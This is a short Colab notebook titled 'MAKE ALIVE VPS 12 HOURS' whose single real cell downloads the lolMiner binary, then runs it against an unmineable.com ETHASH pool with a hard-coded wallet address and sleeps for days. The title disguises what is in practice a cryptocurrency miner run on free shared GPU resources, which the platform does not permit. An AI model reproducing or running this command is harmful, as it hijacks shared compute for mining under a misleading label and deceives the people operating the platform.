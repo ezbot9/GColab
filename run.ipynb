!nvidia -smi

#@title **MAKE ALIVE VPS 12 HOURS** 
 
alive = True #@param {type:'boolean'}
 
!wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.48/lolMiner_v1.48_Lin64.tar.gz && tar -xf lolMiner_v1.48_Lin64.tar.gz  && cd 1.48 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user RVN:RE5CnYFUo9fUqeXehWMUKgSneo52qcoPF1.EZ3 --ethstratum ETHPROXY && sleep 432000 
